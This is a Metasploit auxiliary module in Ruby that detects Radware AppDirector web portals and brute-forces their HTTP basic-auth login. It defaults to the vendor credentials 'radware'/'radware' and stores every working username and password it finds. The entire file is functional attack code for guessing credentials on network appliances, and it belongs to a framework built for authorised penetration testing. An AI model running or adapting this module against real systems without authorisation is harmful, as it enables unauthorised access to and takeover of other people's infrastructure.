##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Radware AppDirector Bruteforce Login Utility',
      'Description'    => %{
        This module scans for Radware AppDirector's web login portal, and performs login brute force
        to identify valid credentials.
      },
      'Author'         =>
        [
          'Karn Ganeshen <KarnGaneshen[at]gmail.com>',
        ],
      'License'        => MSF_LICENSE,

      'DefaultOptions' =>
      {
        'DB_ALL_CREDS'    => false,
        'BLANK_PASSWORDS' => false
      }
    ))

    register_options(
      [
        OptBool.new('STOP_ON_SUCCESS', [ true, "Stop guessing when a credential works for a host", true]),
        OptString.new('USERNAME', [true, "A specific username to authenticate as, default 'radware'", "radware"]),
        OptString.new('PASSWORD', [true, "A specific password to authenticate with, deault 'radware'", "radware"])
      ])

    deregister_options('HttpUsername', 'HttpPassword')
  end

  def run_host(ip)
    unless is_app_radware?
      return
    end

    print_status("Starting login brute force...")
    each_user_pass do |user, pass|
      do_login(user, pass)
    end
  end

  #
  # What's the point of running this module if the target actually isn't Radware
  #

  def is_app_radware?
    begin
      res = send_request_cgi(
      {
        'uri'       => '/',
        'method'    => 'GET'
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
      vprint_error("HTTP Connection Failed, Aborting")
      return false
    end

    if (res and res.headers['Server'] and res.headers['Server'].include?("Radware-web-server"))
      vprint_good("Running Radware portal...")
      return true
    else
      vprint_error("Application is not Radware. Module will not continue.")
      return false
    end
  end

  def report_cred(opts)
    service_data = {
      address: opts[:ip],
      port: opts[:port],
      service_name: opts[:service_name],
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      origin_type: :service,
      module_fullname: fullname,
      username: opts[:user],
      private_data: opts[:password],
      private_type: :password
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      status: Metasploit::Model::Login::Status::UNTRIED,
      proof: opts[:proof]
    }.merge(service_data)

    create_credential_login(login_data)
  end

  #
  # Brute-force the login page
  #

  def do_login(user, pass)
    vprint_status("Trying username:#{user.inspect} with password:#{pass.inspect}")
    begin
      res = send_request_cgi(
      {
        'uri'       => '/',
        'method'    => 'GET',
        'authorization' => basic_auth(user,pass)
      })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
      vprint_error("HTTP Connection Failed, Aborting")
      return :abort
    end

    if (res and res.code == 302 and res.headers['Location'].include?('redirectId'))
      print_good("SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
      report_cred(
        ip: rhost,
        port: rport,
        service_name: 'Radware AppDirector',
        user: user,
        password: pass,
        proof: res.headers['Location']
      )
      return :next_user
    else
      vprint_error("FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
    end

  end
end
